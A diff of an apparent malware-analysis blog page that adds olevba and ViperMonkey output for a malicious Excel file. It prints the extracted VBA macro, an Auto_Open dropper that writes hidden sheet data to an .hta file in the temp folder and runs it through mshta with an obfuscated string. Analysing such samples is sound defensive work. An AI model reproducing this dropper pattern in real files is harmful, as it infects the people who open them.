@@ -220,7 +220,7 @@
     "keywords": ["Malware Analysis"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "266"
+    "wordCount": "628"
   }]
   </script>
 
@@ -963,6 +963,63 @@ External            |0                   |none      |External relationships
 Relationships       |                    |          |such as remote templates, 
                     |                    |          |remote OLE objects, etc   
 --------------------+--------------------+----------+--------------------------</code></pre></div>
+<p>Used olevba to exract the malicious vba code.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">+----------+--------------------+---------------------------------------------+
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">|Type      |Keyword             |Description                                  |
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">+----------+--------------------+---------------------------------------------+
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">|          |                    |objects trigger events                       |
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">|Suspicious|Environ             |May read system environment variables        |
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">|Suspicious|Open                |May open a file                              |
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">|Suspicious|Write               |May write to a file (if combined with Open)  |
+</span></span><span class="line"><span class="ln">10</span><span class="cl">|Suspicious|Output              |May write to a file (if combined with Open)  |
+</span></span><span class="line"><span class="ln">11</span><span class="cl">|Suspicious|Shell               |May run an executable file or a system       |
+</span></span><span class="line"><span class="ln">12</span><span class="cl">|          |                    |command                                      |
+</span></span><span class="line"><span class="ln">13</span><span class="cl">|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+</span></span><span class="line"><span class="ln">14</span><span class="cl">|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+</span></span><span class="line"><span class="ln">15</span><span class="cl">|          |                    |(use option --deobf to deobfuscate)          |
+</span></span><span class="line"><span class="ln">16</span><span class="cl">|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+</span></span><span class="line"><span class="ln">17</span><span class="cl">|          |                    |used to obfuscate strings (option --decode to|
+</span></span><span class="line"><span class="ln">18</span><span class="cl">|          |                    |see all)                                     |
+</span></span><span class="line"><span class="ln">19</span><span class="cl">|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+</span></span><span class="line"><span class="ln">20</span><span class="cl">|          |                    |used to obfuscate strings (option --decode to|
+</span></span><span class="line"><span class="ln">21</span><span class="cl">|          |                    |see all)                                     |
+</span></span><span class="line"><span class="ln">22</span><span class="cl">|IOC       |LwTHLrGh.hta        |Executable file name                         |
+</span></span><span class="line"><span class="ln">23</span><span class="cl">+----------+--------------------+---------------------------------------------+</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">Sub</span> <span class="nf">Auto_Open</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="k">Dim</span> <span class="n">fHdswUyK</span><span class="p">,</span> <span class="n">GgyYKuJh</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="n">Application</span><span class="p">.</span><span class="n">Goto</span> <span class="p">(</span><span class="s">&#34;JLprrpFr&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">GgyYKuJh</span> <span class="o">=</span> <span class="n">Environ</span><span class="p">(</span><span class="s">&#34;temp&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">&#34;\LwTHLrGh.hta&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">Open</span> <span class="n">GgyYKuJh</span> <span class="k">For</span> <span class="n">Output</span> <span class="ow">As</span> <span class="p">#</span><span class="n">1</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">Write</span> <span class="p">#</span><span class="n">1</span><span class="p">,</span> <span class="n">hdYJNJmt</span><span class="p">(</span><span class="n">ActiveSheet</span><span class="p">.</span><span class="n">Shapes</span><span class="p">(</span><span class="n">2</span><span class="p">).</span><span class="n">AlternativeText</span> <span class="o">&amp;</span> <span class="n">UZdcUQeJ</span><span class="p">.</span><span class="n">yTJtzjKX</span> <span class="o">&amp;</span> <span class="n">Selection</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">Close</span> <span class="p">#</span><span class="n">1</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">fHdswUyK</span> <span class="o">=</span> <span class="s">&#34;msh&#34;</span> <span class="o">&amp;</span> <span class="s">&#34;ta &#34;</span> <span class="o">&amp;</span> <span class="n">GgyYKuJh</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="n">fHdswUyK</span><span class="p">,</span> <span class="n">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">End</span> <span class="k">Sub</span></span></span></code></pre></div></div>
+<p>by running a <code>vmonkey</code> i determine this:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">+----------------------+-----------------------------------------------+---------------------------------+
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">| Action               | Parameters                                    | Description                     |
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">+----------------------+-----------------------------------------------+---------------------------------+
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">| Start Regular        |                                               | All wildcard matches will match |
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">| Emulation            |                                               |                                 |
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">| Found Entry Point    | auto_open                                     |                                 |
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">| Object.Method Call   | [&#39;JLprrpFr&#39;]                                  | Application.Goto                |
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">| Environ              | [&#39;temp&#39;]                                      | Interesting Function Call       |
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">| OPEN                 | C:\Users\admin\AppData\Local\Temp\LwTHLrGh.ht | Open File                       |
+</span></span><span class="line"><span class="ln">10</span><span class="cl">|                      | a                                             |                                 |
+</span></span><span class="line"><span class="ln">11</span><span class="cl">| Object.Method Call   | [-2147221504, &#39;&#39;, &#39;&#39;]                         | Err.Raise                       |
+</span></span><span class="line"><span class="ln">12</span><span class="cl">| Dropped File Hash    | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1 | File Name: LwTHLrGh.hta         |
+</span></span><span class="line"><span class="ln">13</span><span class="cl">|                      | d49c01e52ddb7875b4b                           |                                 |
+</span></span><span class="line"><span class="ln">14</span><span class="cl">| Execute Command      | mshta C:\Users\admin\AppData\Local\Temp\LwTHL | Shell function                  |
+</span></span><span class="line"><span class="ln">15</span><span class="cl">|                      | rGh.hta                                       |                                 |
+</span></span><span class="line"><span class="ln">16</span><span class="cl">| Found Entry Point    | label1_click                                  |                                 |
+</span></span><span class="line"><span class="ln">17</span><span class="cl">| Found Entry Point    | Label1_Click                                  |                                 |
+</span></span><span class="line"><span class="ln">18</span><span class="cl">+----------------------+-----------------------------------------------+---------------------------------+</span></span></code></pre></div></div>
+<p>i ran a malicious excel file in sandbox and extracted a <code>LwTHLrGh.hta</code> file.
+`</p>
 
           
           
